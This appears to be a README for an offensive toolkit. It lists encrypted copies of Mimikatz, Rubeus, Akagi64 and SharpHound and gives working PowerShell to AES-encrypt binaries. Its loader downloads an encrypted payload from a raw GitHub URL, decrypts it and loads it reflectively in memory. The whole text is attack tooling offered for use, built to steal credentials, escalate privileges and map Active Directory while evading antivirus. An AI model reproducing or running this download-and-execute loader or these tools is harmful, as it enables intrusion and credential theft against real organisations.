- ps/mmee.txt -- Invoke-Test (Invoke-Mimikatz)
- pe/rub.txt -- Rubeus.exe (encrypted)
- pe/akg.txt -- Akagi64.exe
- pe/sh.txt -- SharpHound.exe (encrypted)

Encrypt with:
```
#$path=""
#$opath=""
$b=[System.IO.File]::ReadAllBytes($path);[Reflection.Assembly]::LoadWithPartialName("System.Security");$p="uW8rPn6M2dFY9XaKjZ0";$s="Q1XxTb7Fw2LyMJ9O8mK";$i="LkN3Px0q9YZbRm82WVT";$r=new-Object System.Security.Cryptography.AesManaged;$p=[Text.Encoding]::UTF8.GetBytes($p);$s=[Text.Encoding]::UTF8.GetBytes($s);$r.Key=(new-Object Security.Cryptography.PasswordDeriveBytes $p,$s,"SHA1",5).GetBytes(32);$r.IV=(new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($i))[0..15];$r.Padding="Zeros";$c=$r.CreateEncryptor();$m=new-Object IO.MemoryStream;$cs = new-Object Security.Cryptography.CryptoStream $m,$c,"Write";$cs.Write($b,0,$b.Length);$cs.Close();$m.Close();$r.Clear();[byte[]]$e=$m.ToArray();[Convert]::ToBase64String($e) | Set-Content $opath;
```

Deploy in memory:
```
#$u="https://raw.githubusercontent.com/tamariz-boop/test/refs/heads/main/pe/sh.txt"
$a=(New-Object System.Net.WebClient).DownloadString($u);$b=[Convert]::FromBase64String($a);
$p="uW8rPn6M2dFY9XaKjZ0";$s="Q1XxTb7Fw2LyMJ9O8mK";$i="LkN3Px0q9YZbRm82WVT";$r=new-Object System.Security.Cryptography.AesManaged;$p=[Text.Encoding]::UTF8.GetBytes($p);$s=[Text.Encoding]::UTF8.GetBytes($s);$r.Key=(new-Object Security.Cryptography.PasswordDeriveBytes $p,$s,"SHA1",5).GetBytes(32);$r.IV=(new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($i))[0..15];$r.Padding="Zeros";$c=$r.CreateDecryptor();$m=[System.IO.MemoryStream]::new($b);$cs=new-Object Security.Cryptography.CryptoStream $m,$c,"Read";$d=New-Object byte[] $b.Length;$cs.Read($d, 0,$d.Length);$cs.Close();$m.Close();$r.Clear();
[System.Reflection.Assembly]::Load($d)
```